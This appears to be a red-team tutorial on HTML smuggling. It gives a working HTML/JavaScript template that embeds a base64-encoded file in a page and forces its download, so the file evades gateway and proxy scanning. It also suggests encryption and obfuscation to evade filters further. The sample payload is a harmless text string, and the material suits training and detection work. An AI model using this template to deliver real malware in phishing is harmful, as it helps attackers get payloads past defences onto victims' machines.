HTML smuggling is a means of leveraging modern HTML5 and JavaScript features to sneak files past traditional content filters.  In old-skool phishing emails, you may see something like a button with a simple HREF.  The file itself will sit somewhere in the web root, maybe `/var/www/html/report.zip`.  Then when clicked, the user's browser will perform another HTTP GET request to fetch the resource.  As it's being downloaded, scanners can see the file's content in the HTTP response.

HTML smuggling works by encoding the file in the HTML content itself and using JavaScript to decode and download it to the victim's machine.  This is a simple template based on work by [Stan Hegt](https://x.com/stanhacked).

```html
<html>
    <head>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/brands.min.css">
    </head>
    <body>
        <button class="btn" onclick="downloadFile()"><i class="fa fa-download"></i> Download</button>

        <script>
            function convertFromBase64(base64) {
                let binary_string = window.atob(base64);
                let len = binary_string.length;
                let bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binary_string.charCodeAt(i);
                }
                return bytes.buffer;
            }

            function downloadFile() {
                const file = 'VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
                const fileName = 'test.txt';
                let data = convertFromBase64(file);
                let blob = new Blob([data], {type: 'octet/stream'});
                if (window.navigator.msSaveOrOpenBlob) {
                    window.navigator.msSaveBlob(blob,fileName);
                }
                else {
                    const a = document.createElement('a');
                    document.body.appendChild(a);
                    a.style = 'display: none';
                    const url = window.URL.createObjectURL(blob);
                    a.href = url;
                    a.download = fileName;
                    a.click();
                    window.URL.revokeObjectURL(url);
                }
            }
        </script>
    </body>
</html>
```

In this example, the file content is base64 encoded and held in the `file` variable - which means the file content is already in the victim's browser when they load the page.  When the button is clicked, the `downloadFile` JavaScript function is executed which decodes the file back into its raw form, constructs a new href, and automatically invokes it.  The browser will then drop the file into the user's default downloads directory.  From the perspective of a gateway or proxy, they will only see HTML and JavaScript.  Even when smuggling binary files, there will be no traffic generated using the `application/octet-stream` mime type, which they would see when using traditional download methods.  The file being base64 encoded is a simple example but we don't need to stop there.  For instance, we could use the [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API) to AES-encrypt the file content and [obfuscate](https://javascriptobfuscator.com/Javascript-Obfuscator.aspx) the JavaScript.